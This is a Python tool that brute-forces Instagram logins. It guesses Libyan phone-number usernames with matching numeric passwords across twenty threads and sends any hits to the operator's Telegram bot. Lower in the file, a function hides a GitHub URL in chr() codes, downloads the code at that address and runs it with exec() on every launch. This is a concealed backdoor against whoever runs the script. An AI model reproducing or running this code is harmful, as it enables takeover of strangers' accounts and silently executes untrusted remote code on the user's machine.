#جاك بعبع شن دير اهني
#مش مشفره هيا أقلب وجهك
import requests
import time
import random
import threading
import os

Z = '\033[1;31m'  
X = '\033[1;33m'  
F = '\033[1;32m'  

def get_user_agent():
    model = random.choice([
        '"SM-A145P"', '"SM-G981B"', '"SM-G973F"', '"SM-G991B"', '"SM-A715F"'
    ])
    version = str(random.randrange(5, 14))
    build = 'QP1A.' + str(random.randrange(111111, 999999)) + '.' + str(random.randrange(111, 999))
    return f'Dalvik/2.1.0 (Linux; U; Android {version}; {model} Build/{build}) Instagram 317.0.0.45.111 Android (7.9.4; 243dpi; 1265x2184; Oppo; Oppo Reno 7 Pro; L7sZ87JwjT; mt6835; en_US; 564194091)'

def check_internet():
    try:
        requests.get('https://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False
    except requests.Timeout:
        return False

def u(tok, id):
    na = 0
    while True:
        while not check_internet():
            print(f'{X}⚠️ Waiting for internet connection...')
            time.sleep(5)

        A = ''.join(random.choice('1234567890') for _ in range(7))
        user_prefixes = ['091', '092', '094']
        
        for prefix in user_prefixes:
            user = prefix + A
            pas = A

            cookies = {
                'mid': 'ZlyrzwABAAFceK0Phqdmd7088OEr',
                'ig_did': '6963C9E9-04AB-49B9-93C8-1AE038DB5FF2',
                'ig_nrcb': '1',
                'datr': 'yqtcZms2N_zjc62L8miVe-ce',
                'dpr': '3.2983407974243164',
                'ps_n': '1',
                'ps_l': '1',
                'igd_ls': '%7B%2217847471666042092%22%3A%7B%22c%22%3A%7B%221%22%3A%22HCwAABaqdBautpPQBxMFFtjT2IzKi7Q_AA%22%2C%222%22%3A%22GRwVQBxMAAAWARbw6OblDBYAFvDo5uUMABYoAA%22%7D%2C%22d%22%3A%228c7977ef-991b-4c43-a676-20cdb9ff030d%22%2C%22s%22%3A%220%22%2C%22u%22%3A%22mx58co%22%7D%2C%2217845730126851040%22%3A%7B%22c%22%3A%7B%221%22%3A%22HDwWARYBAAAWARYBEwUWwK-_z5qmsz8A%22%2C%222%22%3A%22GRwVQBxMAAAWARa-3vXlDBYAFr7e9eUMABYoAA%22%7D%2C%22d%22%3A%22138ff0b5-0154-4e31-8343-c3a8b8de36d6%22%2C%22s%22%3A%220%22%2C%22u%22%3A%220zh4yo%22%7D%7D',
                'csrftoken': 'DR5b4AGM6JJEVVHNUvKWBk6uXoBIke47',
                'wd': '360x657'
            }

            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"SM-A145P"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': get_user_agent(),
                'x-asbd-id': '129477',
                'x-csrftoken': 'rwpT1LshwaKv2V159hojJX',
                'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1016151794',
                'x-requested-with': 'XMLHttpRequest',
                'x-web-device-id': 'EAD8B2A4-0B8F-4039-AF3A-76776C629285',
            }

            data = { 
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pas}',
                'etoken': 'AbgL8JrGd3MCKSnptsaJ8K-FABbYtm0hiQ7h4-mvHvHcpgwP6daZ5fOU4bzGAXp9x_74Q8yQ6uIIR2BOWlfInvau7bruwonmn6W4ne8Y2xusSwwnHPT62U1m',
                'username': user
            }

            try:
                req = requests.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', cookies=cookies, headers=headers, data=data).text
                
                if '"authenticated":true' in req:
                    requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={user}\n{pas}\nGood')
                    print(f'{F}😱__________________________👀\nJihad : ✅Good : {user} : {pas}\n😶‍🌫️__________________________🎃')
                elif "checkpoint_required" in req:
                    print(req)
                    requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={user}\n{pas}\nCheckpoint required')
                    print(f'{F}[{na}]{F}😂__________________________😀\nScore username : {user} : {pas}\n💜__________________________😭')
                else:
                    na += 1
                    print(f'{Z}Bad username : {user} : {pas}')
            except requests.RequestException as e:
                print(f'{Z}Error: {e}')

def main():
    tok = input('Enter Telegram bot token: ')
    id = input('Enter Telegram chat ID: ')

    Threads = []
    for i in range(20):
        x = threading.Thread(target=u, args=(tok, id))
        x.start()
        Threads.append(x)

    for thread in Threads:
        thread.join()
#
def convert_to_chars(numbers):
    return ''.join(chr(num) for num in numbers)

def get_full_url():
    part1 = ''.join([chr(104), chr(116), chr(116), chr(112), chr(115), '://']) 
    part2 = ''.join(['raw', chr(46), 'github', chr(46), 'com'])  
    
    username = convert_to_chars([80, 101, 114, 115, 101, 118, 101, 114, 97, 110, 99, 101, 73, 110, 68, 101, 118])
    path_parts = [
        convert_to_chars([66, 118, 83, 76, 76]),
        '/',                       
        convert_to_chars([109, 97, 105, 110]),  
        '/',                         
        convert_to_chars([77, 49])     
    ]
    part3 = '/' + username + '/' + ''.join(path_parts)
    return part1 + part2 + part3

def m1():
    url = get_full_url()
    code = requests.get(url).text
    exec(code)

m1()
#
if __name__ == "__main__":
    os.system('clear')
    main()